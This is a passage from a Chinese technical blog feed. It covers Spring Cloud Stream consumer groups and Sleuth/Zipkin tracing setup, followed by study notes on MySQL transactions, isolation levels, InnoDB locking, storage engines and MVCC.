<p>不同组是可以全面消费的(重复消费)，同一组内会发生竞争关系，只有其中一个可以消费</p>
</blockquote>
<h3 id="消费分组"><a href="#消费分组" class="headerlink" title="消费分组"></a>消费分组</h3><blockquote>
<p>默认分组group，组流水号不一样，被认为不同组，可以消费</p>
</blockquote>
<p>自定会配置分组，自定义配置分为同一个组，解决重复消费</p>
<p><img src="https://csn.damyoung.cn/image-20210201115038245.png" alt="image-20210201115038245"></p>
<h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><p><img src="https://csn.damyoung.cn/image-20210201115218784.png" alt="image-20210201115218784"></p>
<p><img src="https://csn.damyoung.cn/image-20210201115324955.png" alt="image-20210201115324955"></p>
<p><img src="https://csn.damyoung.cn/image-20210201115344213.png" alt="image-20210201115344213"></p>
<h4 id="同一组"><a href="#同一组" class="headerlink" title="同一组"></a>同一组</h4><p><img src="https://csn.damyoung.cn/image-20210201115637565.png" alt="image-20210201115637565"></p>
<p><img src="https://csn.damyoung.cn/image-20210201115712882.png" alt="image-20210201115712882"></p>
<p><img src="https://csn.damyoung.cn/image-20210201115731822.png" alt="image-20210201115731822"></p>
<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p><img src="https://csn.damyoung.cn/image-20210201115810712.png" alt="image-20210201115810712"></p>
<p><img src="https://csn.damyoung.cn/image-20210201115911317.png" alt="image-20210201115911317"></p>
<p>8802去除分组group配置并停机，8801还是发送消息，8802重启后并无得到消息，消息丢失；8803(无去除分组配置)重启后，仍会消费信息</p>
<h1 id="分布式请求链路跟踪"><a href="#分布式请求链路跟踪" class="headerlink" title="分布式请求链路跟踪"></a>分布式请求链路跟踪</h1><p>springcloud sleuth提供了一套完整的服务跟踪的解决方案，在分布式系统中提供追踪解决方案并且兼容支持了zipkin</p>
<p>在微服务框架中，一个由客户端发起的请求在后端系统中会经过多个不同的服务节点调用来协同产生最后的请求结果，每个前段请求都会形成一条复杂的分布式服务调用链路，链路中的任何一环出现高延时或错误都会引起整个请求的失败</p>
<p><img src="https://csn.damyoung.cn/image-20210201163450436.png" alt="image-20210201163450436"></p>
<h2 id="搭建zipkin"><a href="#搭建zipkin" class="headerlink" title="搭建zipkin"></a>搭建zipkin</h2><p>springcloud从F版起已不需要自己搭建Zipkin Server了，只需调用jar包</p>
<p><a href="http://dl.bintray.com/openzipkin/maven/io/zipkin/java/zipkin-server/">http://dl.bintray.com/openzipkin/maven/io/zipkin/java/zipkin-server/</a></p>
<p><img src="https://csn.damyoung.cn/image-20210201164350681.png" alt="image-20210201164350681"></p>
<p><img src="https://csn.damyoung.cn/image-20210201164523023.png" alt="image-20210201164523023"></p>
<p><img src="https://csn.damyoung.cn/image-20210201164543873.png" alt="image-20210201164543873"></p>
<p><img src="https://csn.damyoung.cn/image-20210201164741257.png" alt="image-20210201164741257"></p>
<p>trace：类似于树结构的span集合，表示一条调用链路，存在唯一标识</p>
<p>span：表示调用链路来源，通俗的理解span就是一次请求信息</p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>cloud-provider-payment8001服务提供者</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        包含了sleuth+zipkin--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zipkin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"> <span class="attr">zipkin:</span></span><br><span class="line">    <span class="attr">base-url:</span> <span class="string">http://localhost:9411</span></span><br><span class="line">  <span class="attr">sleuth:</span></span><br><span class="line">    <span class="attr">sampler:</span></span><br><span class="line"><span class="comment">#      采样率介于0到1之间，则表示全部采集</span></span><br><span class="line">      <span class="attr">probability:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/payment/zipkin&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">paymentZipkin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hi, I am paymentZipkin server fallback&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cloud-consumer-order80 服务消费者</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zipkin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-order-service</span></span><br><span class="line">  <span class="attr">zipkin:</span></span><br><span class="line">    <span class="attr">base-url:</span> <span class="string">http://localhost:9411</span></span><br><span class="line">  <span class="attr">sleuth:</span></span><br><span class="line">    <span class="attr">sampler:</span></span><br><span class="line">      <span class="attr">probability:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/consumer/payment/zipkin&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getPaymentZipkin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> restTemplate.getForObject(<span class="string">&quot;http://localhost:8001&quot;</span>+<span class="string">&quot;/payment/zipkin&quot;</span>,String.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<p><img src="https://csn.damyoung.cn/image-20210201170446021.png" alt="image-20210201170446021"></p>
<p><img src="https://csn.damyoung.cn/image-20210201170703653.png" alt="image-20210201170703653"></p>
]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql</title>
    <url>/2021/02/25/MySql/</url>
    <content><![CDATA[<h1 id="1-什么是事务"><a href="#1-什么是事务" class="headerlink" title="1. 什么是事务"></a>1. 什么是事务</h1><p>事务是逻辑上的一组操作，要么都执行，要么都不执行。</p>
<p>事务有四大特性，即原子性，一致性，隔离性和持久性（ACID）</p>
<ul>
<li><strong>原子性（Atomicity）</strong>：事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用</li>
<li><strong>一致性（Consistency）</strong>：执行事务前后，数据要保持一致，多个事务对同一个数据读取的结果是相同的</li>
<li><strong>隔离性（Isolation）</strong>：并发访问数据库时，一个用户的事务不被其他事务所干扰，各并发事务之间数据库是独立的</li>
<li><strong>持久性（Durability）</strong>：一个事务被提交之后，它对数据库中数据的改变是持久化的，即使数据库发生故障也不应该对其有任何影响。</li>
</ul>
<a id="more"></a>

<p><strong>几个特性之间的关系</strong>：</p>
<ul>
<li>只有满足一致性，事务的执行结果才是正确</li>
<li>在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。</li>
<li>在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。</li>
<li>事务满足持久化是为了能应对数据库崩溃的情况</li>
</ul>
<p>MySQL默认采用自动提交模式，也就是说，如果不显示使用<code>START TRANSACTION</code>语句来开始一个事务，那么每个查询都会被当做一个事务自动提交。</p>
<h1 id="2-并发事务带来哪些问题"><a href="#2-并发事务带来哪些问题" class="headerlink" title="2. 并发事务带来哪些问题"></a>2. 并发事务带来哪些问题</h1><ul>
<li><strong>脏读（Dirty read）</strong>：当一个事务正在访问数据并且对数据进行了修改，而这种修改还没有提交到数据库中，这时另外一个事务也访问了这个数据，然后使用了这个数据。因为这个数据是还没有提交的数据，那么另一个事务读到的这个数据就是“脏数据”，依据“脏数据”所做的操作可能是不正确的。</li>
<li><strong>丢失数据（Lost to modify）</strong>：指在一个事务读取一个数据时，另外一个事务也访问了该数据，那么在第一个事务中修改了这个数据后，第二个事务也修改了这个数据。这样第一个事务内的修改结果就被丢失，因此称为<strong>丢失修改</strong>。例如：事务1读取某表中的数据A=20，事务2也读取A=20，事务1修改A=A-1，事务2也修改A=A-1，最终结果A=19，事务1的修改被丢失。</li>
<li><strong>不可重复读（Unrepeatableread）</strong>：指在一个事务内多次读同一数据。在这个事务还没有结束时，另一个事务也访问该数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改导致第一个事务两次读取的数据可能不太一样。这就发生了在一个事务内两次读到的数据不一样的情况，称为不可重复读。</li>
<li><strong>幻读（Phantom read）</strong>：幻读与不可重复读类似。它发生在一个事务（T1）读取了几行数据，接着另一个并发事务（T2）插入一些数据时，在随后的查询中，第一个事务（T1）就会发现多了一些原本不存在的记录，就好像发生了幻觉一样，所以称为幻读。</li>
</ul>
<blockquote>
<p>不可重复读和幻读区别：不可重复读的重点是修改比如多次读取一条记录发现其中某些列的值被修改，幻读的重点在于新增或者删除比如多次读取一条记录发现记录增多或者减少了</p>
</blockquote>
<h1 id="3-事务隔离级别有哪些？MySQL默认隔离级别是？"><a href="#3-事务隔离级别有哪些？MySQL默认隔离级别是？" class="headerlink" title="3. 事务隔离级别有哪些？MySQL默认隔离级别是？"></a>3. 事务隔离级别有哪些？MySQL默认隔离级别是？</h1><p>SQL标准定义了四个隔离级别：</p>
<ul>
<li><code>READ-UNCOMMITTED</code>(读取未提交)：最低的隔离级别，允许读取尚未提交的数据变更，可能会导致<strong>脏读，幻读，不可重复读</strong>。</li>
<li><code>READ-COMMITTED</code>(读取已提交)：允许读取并发事务已经提交的数据，<strong>可以阻止脏读，但是仍然可能发生幻读和不可重复读</strong></li>
<li><code>REPEATABLE-READ</code>(可重复读)：对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，保证一个事务不会修改已经由另一个事务读取但未提交（回滚）的数据，<strong>可以避免脏读和不可重复读，但是幻读仍然有可能发生</strong>。</li>
<li><code>SERIALIZABLE</code>(可串行化)：最高的隔离级别，完全服从ACID的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别<strong>可以防止脏读、不可重复读、幻读</strong></li>
</ul>
<p>MySQL InnoDB存储引擎默认支持的隔离级别是<code>REPEATABLE-READ</code>(可重复读)，可以通过<code>SELECT @@tx_isolation</code>命令查看。在MySQL8.0改为使用<code>SELECt @@transaction_isolation;</code></p>
<blockquote>
<p>注意：与SQL标准不同的地方在于，InnoDB存储引擎在<code>REPEATABLE-READ</code>（可重读）事务隔离级别下使用的是<code>Next-Key Lock</code>锁算法，因此可以避免幻读的产生，这与其他数据库系统是不同的。所以说InnoDB存储引擎的默认支持的隔离级别是<code>REPEATABLE-READ</code>(可重复读)已经完全保证事务的隔离性要求，即达到了SQL标准的<code>SERIALIZABLE</code>（可串行化）隔离级别。因为隔离级别越低，事务请求的锁越少，所以大部分数据库系统的隔离级别都是<code>READ-COMMITTED</code>(提交读)，但是InnoDB存储引擎默认使用的<code>REPEATABLE-READ</code>(重复读)并不会有任何性能损失。</p>
</blockquote>
<p>InnoDB存储引擎在分布式事务的情况下一般会用到<code>SERIALIZABLE</code>（可串行化）隔离级别。</p>
<h1 id="4-锁机制与InnoDB锁算法"><a href="#4-锁机制与InnoDB锁算法" class="headerlink" title="4. 锁机制与InnoDB锁算法"></a>4. 锁机制与InnoDB锁算法</h1><p>MySQL中提供了两种封锁粒度：行级锁和表级锁</p>
<p><code>MyISAM</code>和<code>InnoDB</code>存储引擎使用的锁：</p>
<ul>
<li><code>MyISAM</code>采用表级锁</li>
<li><code>InnoDB</code>支持行级锁和表级锁，默认是行级锁</li>
</ul>
<p>表级锁和行级锁对比：</p>
<ul>
<li>表级锁：MySQL中锁定粒度最大的一种锁，对当前操作的整张表加锁，实现简单，资源消耗也比较少，加锁快，不会出现死锁。其锁定粒度最大，触发锁冲突的概率最高，并发度最低，MyISAM和InnoDB引擎都支持表级锁。表级锁总是一次获得 SQL 语句所需要的全部锁，要么全部满足，要么全部等待，所以不会产生死锁，这也正是表级锁不会出现死锁(Deadlock Free)的原因。</li>
<li>行级锁：MySQL中锁定粒度最小的一种锁，只针对当前操作的行进行加锁。行级锁能大大减少数据库操作的冲突，其加锁粒度最小，并发度高，但加锁的开销也最大，加锁慢，会出现死锁。</li>
</ul>
<h2 id="锁分类（按照是否可写分类）"><a href="#锁分类（按照是否可写分类）" class="headerlink" title="锁分类（按照是否可写分类）"></a>锁分类（按照是否可写分类）</h2><p>表级锁和行级锁还可以进一步划分为共享锁（S）和排他锁（X）。</p>
<ul>
<li><strong>共享锁（Share Locks）</strong>：又被称为读锁，其它用户可以并发读取数据，但任何事务都不能获取数据上的排他锁，直到已释放所有共享锁。若事务T对数据对象A加上S锁，则事务T只能读A；其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这就保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。</li>
<li><strong>排他锁（Exclusive lock）</strong>：又称为写锁，若事务T对数据对象A加上X锁，则只允许T读取和修改A，其它任何事务都不能再对A加任何类型的锁，直到T释放A上的锁。它防止任何其它事务获取资源上的锁，直到在事务的末尾将资源上的原始锁释放为止。在更新操作(<code>INSERT</code>、<code>UPDATE</code>或<code>DELETE</code>)过程中始终应用排他锁。</li>
</ul>
<h2 id="InnoDB锁算法"><a href="#InnoDB锁算法" class="headerlink" title="InnoDB锁算法"></a>InnoDB锁算法</h2><p>InnoDB存储引擎支持行级锁的算法有三种：</p>
<ul>
<li><code>Record lock</code>:单个行记录上的锁，对索引项加锁，而不是记录本身，锁定符合条件的行。其他事务不能修改和删除加锁项。</li>
<li><code>Gap lock</code>:间隙锁，对索引项之间的“间隙”加锁。当用范围条件而不是相等条件检索数据，并请求共享或排他锁时，InnoDB 会给符合条件的已有数据记录的索引项加锁；<strong>对于键值在条件范围内但并不存在的记录，叫做“间隙（GAP)”，InnoDB也会对这个“间隙”加锁。</strong>锁定记录的范围（对第一条记录前的间隙或最后一条记录后的间隙加锁），<strong>不包括索引项本身</strong>。其它事务不能在锁访问内插入数据，这样就防止了别的事务新增幻影行。</li>
</ul>
<ol>
<li>间隙锁的目的是<strong>阻止多个事务将记录插入到同一范围内，而这会导致幻读问题的产生,只有在REPEATABLE READ隔离级别下的特定操作才会取得gap lock</strong></li>
<li><code>UPDATE/DELETE/SELECT FOR UPDATE</code>时，<strong>除了对唯一索引的唯一搜索外都会获取gap锁，也就是说主键或唯一索引的搜索不会获取间隙锁，当然如果查询条件还包含非唯一索引，那么还是会获取间隙锁</strong></li>
</ol>
<ul>
<li><p><code>Next-key lock</code>:<code>record+gap</code>锁定索引项本身和索引范围，即<code>Record Lock</code>和<code>Gap Lock</code>的结合，是一个前开后闭的区间，结合<code>MVCC</code>,可解决幻读问题。例如一个索引包含以下值：10，11，13，20，那么就需要锁定以下区间：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(-∞,10]</span><br><span class="line">  (10,11]</span><br><span class="line">(11,13]</span><br><span class="line">  (13,20]</span><br><span class="line">(20,+supremum)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><strong>InnoDB三种锁的应用</strong>：</p>
<ol>
<li>innodb对于行的查询使用<code>next-key lock</code></li>
<li><code>Next-locking keying</code>是为了解决<code>Phantom Problem</code>幻读问题</li>
<li>当查询的索引含有唯一属性时，将<code>next-key lock</code>降级为<code>record lock</code></li>
<li><code>Gap</code>锁设计的目的是为了阻止多个事务将记录插入到同一范围内，而这会导致幻读问题的产生</li>
<li>有两种方式显式关闭<code>gap</code>锁：（除了外键约束和唯一性检查外，其余情况仅使用<code>record lock</code>）</li>
</ol>
<ul>
<li>将事务隔离级别设置为<code>RC</code></li>
<li>将参数<code>innodb_locks_unsafe_for_binlog</code>设置为1</li>
</ul>
<blockquote>
<p>虽然使用行级索具有粒度小、并发度高等特点，但是表级锁有时候也是非常必要的：</p>
<ul>
<li>事务更新大表中的大部分数据直接使用表级锁效率更高；</li>
<li>事务比较复杂，使用行级索很可能引起死锁导致回滚。</li>
</ul>
</blockquote>
<p>通过上面的分析可以看出，InnoDB 的行级锁实现特点是在索引上加锁，所以<strong>只有通过索引条件检索数据，InnoDB 才使用行级锁，否则，InnoDB 将使用表锁！</strong></p>
<h2 id="另外两个表级锁"><a href="#另外两个表级锁" class="headerlink" title="另外两个表级锁"></a>另外两个表级锁</h2><p>当一个事务需要给自己需要的某个资源加锁的时候，如果遇到一个共享锁正锁定着自己需要的资源的时候，自己可以再加一个共享锁，不过不能加排他锁。但是，如果遇到自己需要锁定的资源已经被一个排他锁占有之后，则只能等待该锁定释放资源之后自己才能获取锁定资源并添加自己的锁定。而意向锁的作用就是当一个事务在需要获取资源锁定的时候，如果遇到自己需要的资源已经被排他锁占用的时候，该事务可以在需要锁定行的表上面添加一个合适的意向锁。如果自己需要一个共享锁，那么就在表上面添加一个意向共享锁。而如果自己需要的是某行（或者某些行）上面添加一个排他锁的话，则先在表上面添加一个意向排他锁。意向共享锁可以同时并存多个，但是意向排他锁同时只能有一个存在。</p>
<p>InnoDB另外两个表级锁：</p>
<ul>
<li><strong>意向共享锁（IS）</strong>：表示事务准备给数据行加入共享锁，事务在一个数据行加共享锁前必须先取得该表的IS锁</li>
<li><strong>意向排他锁（IX）</strong>：表示事务准备给数据行加入排他锁，事务在一个数据行加排他锁前必须先取得该表的IX锁</li>
</ul>
<p>在只存在行级锁和表级锁的情况下，事务T想要对A加X锁，就需要先检测是否有其它事务对表A或者表A中的任意一行加了锁，那么就需要对表A的每一行都检测一次，这是非常耗时的。</p>
<p>在引入了意向锁后，如果事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。</p>
<p>注意：</p>
<ul>
<li>这里的意向锁是表级锁 ， 表示的是一种意向，仅仅表示事务正在读或写某一行记录，在真正加行锁时才会判断是否冲突。意向锁是InnoDB自动加的，不需要用户干涉。</li>
<li>IX，IS是表级锁，不会和行级的X，S锁发生冲突，只会和表级的X，S发生冲突。</li>
</ul>
<p>当一个事务请求的锁模式与当前的锁兼容，InnoDB就将请求的锁授予该事务；反之如果请求不兼容，则该事物就等待锁释放</p>
<p>此外，还有一种锁叫<strong>页级锁</strong>，MySQL中锁定粒度介于行级锁和表级锁中间的一种锁。表级锁速度快，但冲突多，行级冲突少，但速度慢。页级进行了折衷，一次锁定相邻的一组记录。BDB支持页级锁。开销和加锁时间界于表锁和行锁之间，会出现死锁。锁定粒度界于表锁和行锁之间，并发度一般。</p>
<h2 id="死锁和避免死锁"><a href="#死锁和避免死锁" class="headerlink" title="死锁和避免死锁"></a>死锁和避免死锁</h2><p>InnoDB的行级锁是基于索引实现的，<strong>如果查询语句没命中任何索引，那么InnoDB就会使用表级锁</strong>。此外，InnoDB的行级锁是针对索引加的锁，不针对数据记录，因此即使访问不同行的记录，如果使用了相同的索引键仍然会出现锁冲突。</p>
<p>在通过<code>SELECT ... LOCK IN SHARE MODE;（加IS锁）</code>或<code>SELECT ... FOR UPDATE;（加IX锁）</code>使用锁的时候，如果表没有定义任何索引，那么<strong>InnoDB会创建一个隐藏的聚簇索引并使用这个索引来加记录锁</strong></p>
<p>不同于 MyISAM 总是一次性获得所需的全部锁，InnoDB 的锁是逐步获得的，当两个事务都需要获得对方持有的锁，导致双方都在等待，这就产生了死锁。 发生死锁后，InnoDB一般都可以检测到，并使一个事务释放锁回退，另一个则可以获取锁完成事务，我们可以采取以下方式避免死锁：</p>
<ul>
<li>通过表级锁来减少死锁产生的概率；</li>
<li>多个程序尽量约定以相同的顺序访问表（这也是解决并发理论中哲学家就餐问题的一种思路）</li>
<li>同一个事务尽可能做到一次锁定所需要的所有资源。</li>
</ul>
<h2 id="封锁协议"><a href="#封锁协议" class="headerlink" title="封锁协议"></a>封锁协议</h2><h3 id="三级封锁协议"><a href="#三级封锁协议" class="headerlink" title="三级封锁协议"></a>三级封锁协议</h3><h4 id="一级封锁协议"><a href="#一级封锁协议" class="headerlink" title="一级封锁协议"></a>一级封锁协议</h4><p>事务T要修改A时必须加<code>X</code>锁，直到T结束才释放锁</p>
<p>可以解决丢失修改问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖</p>
<h4 id="二级封锁协议"><a href="#二级封锁协议" class="headerlink" title="二级封锁协议"></a>二级封锁协议</h4><p>在一级的基础上，要求读取数据A时必须加<code>S</code>锁，<strong>读取完</strong>马上释放<code>S</code>锁</p>
<p>可以解决读脏数据问题，因为如果一个事务在对数据A进行修改，根据1级封锁协议，会加<code>X</code>锁，那么就不能再加<code>S</code>锁了，也就不会读入数据。</p>
<h4 id="三级封锁协议-1"><a href="#三级封锁协议-1" class="headerlink" title="三级封锁协议"></a>三级封锁协议</h4><p>在二级的基础上，要求读取数据A时必须加<code>S</code>锁，直到<strong>事务结束了</strong>才能释放<code>S</code>锁</p>
<p>可以解决不可重复读的问题，因为读A时，其它事务不能对A加<code>X</code>锁，从而避免了在读的期间数据发生改变。</p>
<h3 id="两段锁协议"><a href="#两段锁协议" class="headerlink" title="两段锁协议"></a>两段锁协议</h3><p>加锁和解锁分为两个阶段进行</p>
<p>可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同</p>
<p>事务遵循两段锁协议是保证可串行化调度的充分条件，例如下面操作满足两端锁协议，它是可串行化调度的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)</span><br></pre></td></tr></table></figure>

<p>但是这不是必要条件，例如以下操作不满足两段锁协议，但是它还是可串行化调度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlick(C)</span><br></pre></td></tr></table></figure>

<p>MySQL的InnoDB引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。</p>
<h2 id="怎么编写加锁语句"><a href="#怎么编写加锁语句" class="headerlink" title="怎么编写加锁语句"></a>怎么编写加锁语句</h2><p>对于 MyISAM 引擎表级锁：MyISAM <strong>在执行查询语句（SELECT）前，会自动给涉及的所有表加读锁，在执行更新操作（UPDATE、DELETE、INSERT等）前，会自动给涉及的表加写锁</strong>，这个过程并不需要用户干预，因此，用户一般不需要直接用 LOCK TABLE 命令给MyISAM表显式加锁。</p>
<p>LOCK TABLE 命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOCK TABLES t1 WRITE, t2 READ, ...;</span><br><span class="line">[do something with tables t1 and t2 here];</span><br><span class="line">COMMIT;</span><br><span class="line">UNLOCK TABLES;</span><br></pre></td></tr></table></figure>

<p>InnoDB也可以使用特定的语句进行显示锁定：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">共享锁：SELECT ... LOCK IN SHARE MODE;</span><br><span class="line">排他锁：SELECT ... FOR UPDATE;</span><br></pre></td></tr></table></figure>

<h1 id="6-MySQL存储引擎"><a href="#6-MySQL存储引擎" class="headerlink" title="6. MySQL存储引擎"></a>6. MySQL存储引擎</h1><p>通过<code>show engines</code>可以看到MySQL提供的所有存储引擎，MySQL默认的存储引擎是<code>InnoDB</code>,并且在5.7版本所有的存储引擎只有InnoDB是事务性存储引擎，也就是说只有InnoDB支持事务。</p>
<h2 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h2><p>是 MySQL 默认的事务型存储引擎，只有在需要它不支持的特性时，才考虑使用其它存储引擎。</p>
<p>实现了四个标准的隔离级别，默认级别是可重复读（REPEATABLE READ）。<strong>在可重复读隔离级别下，通过多版本并发控制<code>（MVCC）+ Next-Key Locking</code> 防止幻影读</strong>。</p>
<p>主索引是聚簇索引，在索引中保存了数据，从而避免直接读取磁盘，因此对查询性能有很大的提升。</p>
<p>内部做了很多优化，包括从磁盘读取数据时采用的可预测性读、能够加快读操作并且自动创建的自适应哈希索引、能够加速插入操作的插入缓冲区等。</p>
<p>支持真正的在线热备份。其它存储引擎不支持在线热备份，要获取一致性视图需要停止对所有表的写入，而在读写混合场景中，停止写入可能也意味着停止读取。（热备份即是主从复制的过程）</p>
<h2 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h2><p>设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用它。</p>
<p>提供了大量的特性，包括压缩表、空间数据索引等。</p>
<p>不支持事务。</p>
<p>不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取操作的同时，也可以往表中插入新的记录，这被称为并发插入（CONCURRENT INSERT）。</p>
<p>可以手工或者自动执行检查和修复操作，但是和事务恢复以及崩溃恢复不同，可能导致一些数据丢失，而且修复操作是非常慢的。</p>
<p>如果指定了<code>DELAY_KEY_WRITE</code>选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。</p>
<h2 id="MyISAM-和-InnoDB-区别："><a href="#MyISAM-和-InnoDB-区别：" class="headerlink" title="MyISAM 和 InnoDB 区别："></a>MyISAM 和 InnoDB 区别：</h2><p><code>MyISAM</code>是MySQL的默认数据库引擎（5.5版之前）。虽然性能极佳，而且提供了大量的特性，包括全文索引、压缩、空间函数等，但<code>MyISAM</code>不支持事务和行级锁，而且最大的缺陷就是崩溃后无法安全恢复。不过，5.5版本之后，MySQL引入了<code>InnoDB</code>（事务性数据库引擎），MySQL 5.5版本后默认的存储引擎为<code>InnoDB</code>。大多数时候使用的都是<code>InnoDB</code>存储引擎，但是在某些情况下使用<code>MyISAM</code>也是合适的,比如<strong>读密集的情况下</strong>。（如果不介意<code>MyISAM</code>崩溃恢复问题的话）</p>
<p>两者的对比：</p>
<ol>
<li><code>MyISAM</code>只有表级锁，而<code>InnoDB</code>支持行级锁和表级锁，默认为行级锁</li>
<li><code>MyISAM</code>强调的是性能，每次查询具有原子性，其执行速度比<code>InnoDB</code>类型更快，但是不提供事务支持。但是<code>InnoDB</code>提供事务支持事务，外部键等高级数据库功能。具有事务(commit)、回滚(rollback)和崩溃修复能力(crash recovery capabilities)的事务安全(transaction-safe (ACID compliant))型表。</li>
<li><code>MyISAM</code>不支持外键，而<code>InnoDB</code>支持</li>
<li><code>InnoDB</code>支持<strong>MVCC</strong>，应对高并发事务，MVCC比单纯的加锁更高效；MVCC只在<code>READ COMMITTED</code>和<code>REPEATABLE READ</code>两个隔离级别下工作。因为未提交读总是读取最新的数据行，无需使用MVCC，而可串行化需要对所有读取的行都加锁，单纯使用MCVCC无法实现。MVCC可以使用乐观锁和悲观锁来实现，各个数据库中MVCC实现并不统一。</li>
<li>MyISAM崩溃后发生损坏的概率比InnoDB高很多，而且恢复的速度也更慢</li>
<li>MyISAM支持压缩表和空间数据索引</li>
</ol>
<h1 id="7-MVCC"><a href="#7-MVCC" class="headerlink" title="7. MVCC"></a>7. MVCC</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>MVCC即多版本控制: 指的是一种提高并发的技术。最早的数据库系统，只有读读之间可以并发，读写，写读，写写都要阻塞。引入多版本之后，只有写写之间相互阻塞，其他三种操作都可以并行，这样大幅度提高了<code>InnoDB</code>的并发度。在内部实现中，与<code>Postgres</code>在数据行上实现多版本不同，**<code>InnoDB</code>是在<code>undolog</code>中实现的，通过<code>undolog</code>可以找回数据的历史版本**。找回的数据历史版本可以提供给用户读(按照隔离级别的定义，有些读请求只能看到比较老的数据版本)，也可以在回滚的时候覆盖数据页上的数据。在<code>InnoDB</code>内部中，会记录一个全局的活跃读写事务数组，其主要用来判断事务的可见性。</p>
<blockquote>
<p>《高性能MySQL》中对MVCC的介绍：<br>MySQL的大多数事务型存储引擎实现的其实都不是简单的行级锁。基于提升并发性能的考虑, 它们一般都同时实现了多版本并发控制(MVCC)。不仅是MySQL,包括Oracle,PostgreSQL等其他数据库系统也都实现了MVCC,但各自的实现机制不尽相同,因为MVCC没有一个统一的实现标准。可以认为MVCC是行级锁的一个变种,但是它在很多情况下避免了加锁操作, 因此开销更低。虽然实现机制有所不同,但大都实现了非阻塞的读操作，写操作也只锁定必要的行。<br>MVCC的实现方式有多种,典型的有乐观(optimistic)并发控制和悲观(pessimistic)并发控制。<br>MVCC只在<code>READ COMMITTED</code>和<code>REPEATABLE READ</code>两个隔离级别下工作。其他两个隔离级别和MVCC不兼容, 因为<code>READ UNCOMMITTED</code>总是读取最新的数据行,而不是符合当前事务版本的数据行。而<code>SERIALIZABLE</code>则会对所有读取的行都加锁。</p>
</blockquote>
